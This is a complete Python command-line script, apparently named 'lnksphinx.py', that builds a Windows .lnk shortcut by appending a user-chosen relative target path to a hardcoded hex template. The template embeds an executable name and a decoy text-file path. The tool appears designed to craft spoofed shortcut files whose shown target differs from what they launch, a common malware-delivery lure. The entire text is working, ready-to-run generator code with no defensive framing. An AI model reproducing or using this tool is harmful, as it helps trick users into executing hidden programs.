import sys

def create_lnk(target_file, out_file):
    # Get the length of the target file
    userLength = len(target_file) + 2

    # Convert the target file parameter value to hex
    userHex = ''.join(format(ord(char), '02x') for char in target_file)

    # Insert a null byte between each character of the hex string
    userHex = '00'.join(userHex[i:i+2] for i in range(0, len(userHex), 2))

    # Convert userLength to hex
    userLengthHex = format(userLength, 'x')
    userLengthHex = userLengthHex.zfill(2)  # Pad with leading zeros to ensure 4 characters

    bigBlob = (
        "4C0000000114020000000000C0000000000000469B00080020000000D0E9EEF21515C901D0E9EEF21515C901D0E9EEF21515C901000000000000000001000000000000000000000000000000E2003A001F483ACCBFB42CDB4C42B0297FE99A87C641260001002600EFBE110000005AE2E2AE2C9AD9019F43F3F165A5DA015615125266A5DA0114004400310000000000AD58689710007800340009000400EFBEAD581B97AD5869972E000000235F05000000100000000000000000000000000000006DDD32007800000010006200320098BC0300874F2E112200363636363636362E65786500480009000400EFBEAD585997AD5859972E000000BB6B05000000450000000000000000000000000000000000000036003600360036003600360036002E006500780065000000140000003C0000001C000000010000001C0000002D000000000000003B0000001100000003000000818A7A301000000000433A5C746573745C612E7478740000"
    )

    # Concatenate userLength hex, 00 2E 00 5C 00, and userHex
    finalHex = userLengthHex + "002E005C00" + userHex + "00"

    # Concatenate finalHex to the end of the big blob
    modifiedBlob = bigBlob + finalHex

    # Ensure modifiedBlob has a valid length (multiple of 2) by appending zeros if necessary
    if len(modifiedBlob) % 2 != 0:
        modifiedBlob += '00'

    # Save the modified blob as a file with the user supplied <outfile> parameter value and extension .lnk
    outFileName = out_file + ".lnk"
    with open(outFileName, 'wb') as outFile:
        outFile.write(bytes.fromhex(modifiedBlob))

    print("File saved as:", outFileName)

def main():
    # Check if correct number of arguments are provided
    if len(sys.argv) != 3:
        print("Usage: lnksphinx.py <targetFile> <outFile>")
        return
    
    target_file = sys.argv[1]
    out_file = sys.argv[2]
    
    create_lnk(target_file, out_file)

if __name__ == "__main__":
    main()
